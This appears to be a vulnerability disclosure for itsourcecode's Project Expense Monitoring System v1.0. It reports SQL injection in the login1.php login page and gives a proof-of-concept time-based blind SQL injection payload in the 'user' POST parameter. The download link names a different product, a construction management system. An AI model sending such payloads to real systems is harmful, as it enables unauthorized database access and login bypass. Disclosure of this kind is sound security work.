# Vendor

itsourcecode

# Product

Project Expense Monitoring System

# version

V1.0

# Download 

https://itsourcecode.com/wp-content/uploads/2021/03/Construction-Management-System-Project-In-PHP-Source-Code.zip

# Vulnerability

SQLi

# Description

On the login1.php login authentication page, attackers can construct SQL statements to obtain sensitive information from the database and use universal passwords to log in to the backend.

# Analysis

In the login1.php page, the database query is performed through the mysqli_query method, and the input username string is not filtered enough, which can prevent XSS attacks, but cannot prevent SQLi injection.
<img width="1011" alt="image" src="https://github.com/user-attachments/assets/8d488cb3-e506-481b-81af-d2469191c994">
<img width="360" alt="image" src="https://github.com/user-attachments/assets/e431f357-40d1-4798-aec4-280992033630">

# POC
```
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 5289 FROM (SELECT(SLEEP(5)))cTae) AND 'rmay'='rmay&pass=123
```
